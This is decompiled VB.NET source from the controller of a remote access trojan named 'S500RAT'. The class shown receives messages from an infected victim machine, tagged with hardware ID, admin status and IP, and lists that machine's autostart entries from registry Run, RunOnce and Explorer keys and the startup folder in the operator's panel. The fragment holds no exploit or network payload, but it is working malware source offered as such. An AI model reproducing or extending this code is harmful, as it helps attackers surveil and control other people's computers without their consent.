Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200005F RID: 95
	Public Class FrmStartup
		' Token: 0x060011BC RID: 4540 RVA: 0x0009DB60 File Offset: 0x0009BD60
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formStartup As FormStartup = CType(Application.OpenForms("FormStartup" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormStartup)
				Dim flag As Boolean = formStartup IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formStartup.Client Is Nothing
					If flag2 Then
						formStartup.Client = client
						formStartup.Timer1.Enabled = True
					End If
					Try
						formStartup.Admin = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Admin").AsString)
						formStartup.L1.Items.Clear()
						Dim array As String() = Strings.Split(unpack_msgpack.ForcePathObject("Message").AsString, vbCrLf, -1, CompareMethod.Binary)
						For Each text As String In array
							Dim flag3 As Boolean = text.StartsWith("%CU_RUN%")
							If flag3 Then
								Dim array3 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
								Dim listViewItem As ListViewItem = New ListViewItem() With { .Text = array3(1) }
								listViewItem.SubItems.Add(array3(2))
								listViewItem.ImageIndex = 0
								listViewItem.Group = formStartup.L1.Groups("Group1")
								formStartup.L1.Items.Add(listViewItem)
							Else
								Dim flag4 As Boolean = text.StartsWith("%CU_ONCE%")
								If flag4 Then
									Dim array4 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
									Dim listViewItem2 As ListViewItem = New ListViewItem() With { .Text = array4(1) }
									listViewItem2.SubItems.Add(array4(2))
									listViewItem2.ImageIndex = 0
									listViewItem2.Group = formStartup.L1.Groups("Group2")
									formStartup.L1.Items.Add(listViewItem2)
								Else
									Dim flag5 As Boolean = text.StartsWith("%CU_EXPLO%")
									If flag5 Then
										Dim array5 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
										Dim listViewItem3 As ListViewItem = New ListViewItem() With { .Text = array5(1) }
										listViewItem3.SubItems.Add(array5(2))
										listViewItem3.ImageIndex = 0
										listViewItem3.Group = formStartup.L1.Groups("Group3")
										formStartup.L1.Items.Add(listViewItem3)
									Else
										Dim flag6 As Boolean = text.StartsWith("%MA_RUN%")
										If flag6 Then
											Dim array6 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
											Dim listViewItem4 As ListViewItem = New ListViewItem() With { .Text = array6(1) }
											listViewItem4.SubItems.Add(array6(2))
											listViewItem4.ImageIndex = 0
											listViewItem4.Group = formStartup.L1.Groups("Group4")
											formStartup.L1.Items.Add(listViewItem4)
										Else
											Dim flag7 As Boolean = text.StartsWith("%MA_ONCE%")
											If flag7 Then
												Dim array7 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
												Dim listViewItem5 As ListViewItem = New ListViewItem() With { .Text = array7(1) }
												listViewItem5.SubItems.Add(array7(2))
												listViewItem5.ImageIndex = 0
												listViewItem5.Group = formStartup.L1.Groups("Group5")
												formStartup.L1.Items.Add(listViewItem5)
											Else
												Dim flag8 As Boolean = text.StartsWith("%MA_EXPLO%")
												If flag8 Then
													Dim array8 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
													Dim listViewItem6 As ListViewItem = New ListViewItem() With { .Text = array8(1) }
													listViewItem6.SubItems.Add(array8(2))
													listViewItem6.ImageIndex = 0
													listViewItem6.Group = formStartup.L1.Groups("Group6")
													formStartup.L1.Items.Add(listViewItem6)
												Else
													Dim flag9 As Boolean = text.StartsWith("%FOLD_UP%")
													If flag9 Then
														Dim array9 As String() = Strings.Split(text, "--->", -1, CompareMethod.Binary)
														Dim listViewItem7 As ListViewItem = New ListViewItem() With { .Text = array9(1) }
														listViewItem7.SubItems.Add(Functions.BytesToSize(Conversions.ToLong(array9(2))))
														Dim flag10 As Boolean = Operators.CompareString(listViewItem7.Text, "desktop.ini", False) = 0
														If flag10 Then
															listViewItem7.ImageIndex = 2
														Else
															listViewItem7.ImageIndex = 1
														End If
														listViewItem7.Group = formStartup.L1.Groups("Group7")
														formStartup.L1.Items.Add(listViewItem7)
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						Next
						formStartup.StartupNum.Text = "Startup [ " + Conversions.ToString(formStartup.L1.Items.Count) + " ]"
					Catch ex As Exception
					End Try
				End If
			Catch ex2 As Exception
				ListLogs.AddArray("Task Manager " + client.IP + " Error : " + ex2.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
